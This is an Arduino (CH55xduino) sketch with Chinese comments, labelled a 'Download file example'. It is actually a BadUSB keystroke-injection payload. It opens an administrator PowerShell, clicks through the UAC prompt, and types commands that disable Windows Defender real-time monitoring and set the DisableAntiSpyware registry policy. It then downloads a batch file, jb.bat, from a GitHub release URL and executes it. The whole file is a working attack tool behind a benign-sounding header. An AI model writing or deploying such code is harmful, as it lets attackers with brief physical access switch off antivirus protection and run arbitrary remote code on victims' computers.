/* 
  Download file example using PowerShell

  created 2024
  by Your Name for use with CH55xduino

  This example code is in the public domain.

*/
#ifndef USER_USB_RAM
#error "This example needs to be compiled with a USER USB setting"
#endif

#include "USBHIDKeyboard.h"

void setup() {
  USBInit();
  delay(500);  // 等待设备准备好
}

void loop() {
  delay(1000);

  // Step 1: 按下 Windows + X 键，打开高级用户菜单
  Keyboard_press(KEY_LEFT_GUI);  // 按下 Windows 键
  Keyboard_press('x');           // 按下 X 键
  delay(100);                    // 短暂延迟
  Keyboard_releaseAll();          // 释放所有按键

  delay(500);  // 等待菜单弹出

  // Step 2: 按下 A 键，选择 PowerShell (管理员)
  Keyboard_press('a');
  delay(100);
  Keyboard_releaseAll();  // 释放所有按键

  delay(1500);  // 等待 UAC 界面弹出

 
 // Step 3: 按下左方向键，选择 "是" 按钮
  Keyboard_press(KEY_LEFT_ARROW);  // 按下左箭头
  delay(100);
  Keyboard_releaseAll();           // 释放左箭头

  delay(500);  // 等待光标移动到“是”
 

  // Step 4: 按下 Enter 键，确认管理员权限
  Keyboard_press(KEY_RETURN);  // 按下 Enter 键
  delay(100);  // 等待
  Keyboard_releaseAll();  // 释放所有按键

  // Step 5: 执行两次ctrl+c防止出错
//  for (int i = 0; i < 2; i++) {  // 循环两次
  Keyboard_press(0xE0);  // 按下 CTRL 键 (0xE0 是 左ctrl 键的 HID 代码)
  //Keyboard_press('c');
 // delay(300);
  Keyboard_releaseAll();  // 释放所有按键
  delay(500);
  //}

  //关安全防护的！！！
  const char* fanghu =
    "Set-MpPreference -DisableRealtimeMonitoring $true\n"
    "reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiSpyware\" /d 1 /t REG_DWORD /f\n";


  // 输入命令的每个字符
  for (size_t i = 0; i < strlen(fanghu); i++) {
    Keyboard_write(fanghu[i]);
    delay(10);  // 添加适当的延迟，确保不会输入过快
  }
  
 // Step 6: 在 PowerShell 中创建 Downloads 文件夹（如果不存在）并下载文件
  // 给 PowerShell 确保准备好接收输入
 
  const char* command = 
    "if (!(Test-Path -Path (Join-Path -Path $env:USERPROFILE -ChildPath 'Downloads'))) { New-Item -ItemType Directory -Path (Join-Path -Path $env:USERPROFILE -ChildPath 'Downloads') }\n"
    "Invoke-WebRequest -Uri 'https://github.com/ll2310782478/badusb/releases/download/1/jb.bat' -OutFile (Join-Path -Path $env:USERPROFILE -ChildPath 'Downloads\\jb.bat')\n";
  
  // 输入命令的每个字符
  for (size_t i = 0; i < strlen(command); i++) {
    Keyboard_write(command[i]);
    delay(10);  // 添加适当的延迟，确保不会输入过快
  }
  /*// 按下 Enter 键来执行命令
  Keyboard_press(0x28);  // 按下 Enter 键
  delay(100);
  Keyboard_releaseAll();  // 释放所有按键
  */
  
// Step 7: 执行下载的文件
  delay(100);  //不需要等待时间因为系统在下载是不会执行命令 等待下载完成

  const char* runCommand = 
    "Start-Process -FilePath (Join-Path -Path $env:USERPROFILE -ChildPath 'Downloads\\jb.bat')";
  
  // 输入运行命令的每个字符
  for (size_t i = 0; i < strlen(runCommand); i++) {
    Keyboard_write(runCommand[i]);
    delay(10);  // 添加适当的延迟
  }
  Keyboard_write('\n');  // 发送换行 ！！！可以模拟回车

 /* // 按下 Enter 键来执行运行命令
  Keyboard_press(0x28);  // 按下 Enter 键
  delay(100);
  Keyboard_releaseAll();  // 释放所有按键
*/

  // 停止循环，防止重复运行
  for (;;) { /* 空循环，防止重复运行 */ }
}
